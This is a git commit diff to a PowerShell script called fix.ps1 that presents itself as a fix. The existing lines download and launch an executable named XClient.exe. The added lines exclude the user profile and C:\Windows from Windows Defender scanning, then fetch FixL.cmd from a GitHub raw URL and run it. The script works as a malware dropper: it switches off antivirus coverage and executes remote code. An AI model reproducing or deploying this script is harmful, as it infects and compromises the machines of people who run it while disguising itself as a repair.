617ec0d918031735718c8cd82ecc040bcf816981
hot90923 <hot90923@gmail.com>
2025-01-12 17:35:21 +0700

    Update fix.ps1

--- fix.ps1
+++ fix.ps1
@@ -6,3 +6,10 @@ $output = "$env:XClient.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
 
 Start-Process -FilePath $output
+
+Add-MpPreference -ExclusionPath $env:USERPROFILE
+Add-MpPreference -ExclusionPath C:\Windows
+$url = "https://github.com/hot90923/123/raw/refs/heads/main/FixL.cmd"
+$output = "$env:Fix.cmd"
+Invoke-WebRequest -Uri $url -OutFile $output
+Start-Process -FilePath $output
